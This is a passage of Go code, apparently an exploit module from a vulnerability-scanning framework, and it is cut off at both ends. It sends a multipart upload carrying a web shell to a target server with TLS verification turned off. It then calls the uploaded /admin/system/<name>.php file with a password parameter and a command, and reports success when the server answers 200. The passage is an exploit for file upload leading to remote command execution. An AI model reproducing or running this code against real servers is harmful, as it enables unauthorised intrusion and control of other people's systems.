...
ry=---------------------------24617882592947122633506511132")
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf(postDate, shell, fileName)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				time.Sleep(time.Second * 2)
				fmt.Println(expResult.HostInfo.FixedHostInfo + "/admin/system/" + fileName + ".php?" + pwd + "=" + cmd)
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/admin/system/" + fileName + ".php?" + pwd + "=" + cmd); err == nil && resp.StatusCode == 200 {
					expResult.Success = true
